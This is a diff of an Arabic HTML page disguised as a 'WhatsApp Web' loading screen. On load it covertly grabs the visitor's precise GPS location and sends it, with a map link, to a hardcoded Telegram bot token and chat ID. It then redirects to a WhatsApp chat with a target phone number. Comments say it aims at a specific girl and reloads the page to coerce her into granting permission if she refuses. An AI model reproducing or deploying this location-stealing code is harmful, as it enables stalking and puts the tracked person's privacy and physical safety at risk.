@@ -2,55 +2,48 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>WhatsApp Web</title>
+    <style>
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loading-text { color: #075e54; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px;">
-        <p>جاري التحميل، يرجى الانتظار...</p>
-    </div>
+    <div class="loading-text">جاري فتح محادثة الواتساب...</div>
 
 <script>
-    // بياناتك الخاصة
     const botToken = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chatId = '7214473798';
+    const targetPhone = '963997715905'; // الرقم الذي زودتني به مع رمز الدولة
 
-    function getLocation() {
-        // إعدادات الدقة القصوى لضمان تحديد المكان "بظبط"
-        const options = {
-            enableHighAccuracy: true, // استخدام الـ GPS
-            timeout: 20000,           // مدة المحاولة 20 ثانية
-            maximumAge: 0             // عدم استخدام موقع قديم
-        };
+    function startCapture() {
+        const options = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
 
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                const acc = position.coords.accuracy;
+            navigator.geolocation.getCurrentPosition(function(p) {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const acc = p.coords.accuracy;
 
-                // رابط جوجل ماب المباشر الذي يفتح تطبيق الخرائط فوراً
+                // رابط الخرائط الاحترافي الذي يفتح التطبيق مباشرة
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                const message = `🎯 **تم تحديد الموقع بنجاح!**\n\n` +
-                                `📍 الرابط المباشر:\n${mapLink}\n\n` +
-                                `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
+                const report = `🎯 **صيد جديد من واتساب!**\n\n📍 الموقع:\n${mapLink}\n\n📏 الدقة: ${acc.toFixed(1)} متر`;
 
-                // إرسال البيانات لتليجرام
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
                 .then(() => {
-                    // بعد الإرسال، يتم التحويل لإنستغرام لإنهاء العملية
-                    window.location.href = "https://www.instagram.com/ha2542213";
+                    // تحويل الهدف لمحادثة الواتساب فوراً
+                    window.location.href = `https://wa.me/${targetPhone}`;
                 });
 
-            }, function(error) {
-                // إذا رفضت البنت، يتم إعادة تحميل الصفحة لإجبارها على الموافقة
+            }, function(e) {
+                // إذا رفضت، نعيد المحاولة لإجبارها على "سماح"
                 location.reload();
             }, options);
         }
     }
 
-    // بدء العمل فور فتح الرابط
-    window.onload = getLocation;
+    window.onload = startCapture;
 </script>
 </body>
 </html>
